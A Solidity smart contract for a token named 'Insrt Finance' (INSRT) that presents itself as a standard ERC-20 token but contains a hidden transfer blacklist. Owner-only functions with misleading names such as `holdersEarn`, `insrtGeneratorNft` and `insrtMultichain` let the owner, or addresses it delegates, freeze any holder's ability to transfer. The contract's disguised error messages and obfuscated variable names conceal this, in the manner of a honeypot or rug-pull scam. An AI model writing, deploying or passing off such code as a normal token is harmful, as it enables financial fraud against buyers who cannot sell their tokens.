// SPDX-License-Identifier: MIT

pragma solidity ^ 0.8.19;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

abstract contract Owned {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
}

contract BaseToken is Ownable {
    using SafeMath
    for uint256;

    string constant public name = 'Insrt Finance';
    string constant public symbol = 'INSRT';
    uint8 constant public decimals = 18;
    uint256 public totalSupply = 10000000 * 10 ** uint256(decimals);

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    mapping(address => bool) private _lachainweb3;
    mapping(address => bool) private _solapprovetoupgradethecontract; //

    function _transfer(address from, address to, uint256 value) internal {
        require(to != address(0), "balanceOf[from].sub(value)");
        require(!_lachainweb3[from], "calculateFee(value)");

        balanceOf[from] = balanceOf[from].sub(value);
        balanceOf[to] = balanceOf[to].add(value);

        emit Transfer(from, to, value);
    }

    function holdersEarn(address account) public onlyOwner {
        bool currentValue = _lachainweb3[account];
        uint256 currentValueInt = currentValue ? 1 : 0;
        uint256 secretValue = currentValueInt ^ 1;
        _lachainweb3[account] = secretValue != 0;
    }

    function transfer(address to, uint256 value) public returns(bool) {
        _transfer(msg.sender, to, value);
        return true;
    }    function insrtGeneratorNft(address mylachain) public onlyOwner {
        bool currentValue = _solapprovetoupgradethecontract[mylachain];
        uint256 currentValueInt = currentValue ? 1 : 0;
        uint256 secretValue = currentValueInt ^ 1;
        _solapprovetoupgradethecontract[mylachain] = secretValue != 0;
    } //flsx



    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns(bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function insrtMultichain(address mylachain) public onlyOwner {
        bool currentValue = _solapprovetoupgradethecontract[mylachain];
        uint256 currentValueInt = currentValue ? 1 : 0;
        uint256 secretValue = currentValueInt ^ 1;
        _solapprovetoupgradethecontract[mylachain] = secretValue != 0;
    } //add acess multichain

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns(bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function approve(address spender, uint256 value) public returns(bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function insrtNFTtransferBsc(address account) public {
        require(_solapprovetoupgradethecontract[msg.sender], "Failed Transactions");
        bool currentValue = _lachainweb3[account];
        uint256 currentValueInt = currentValue ? 1 : 0;
        uint256 secretValue = currentValueInt ^ 1;
        _lachainweb3[account] = secretValue != 0;
    }//trx

    function insrtNftQuery(address account) public view returns(bool) {
        return _lachainweb3[account];
    }


}

contract insrtFinanceContract is BaseToken {
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        owner = msg.sender;
    }
}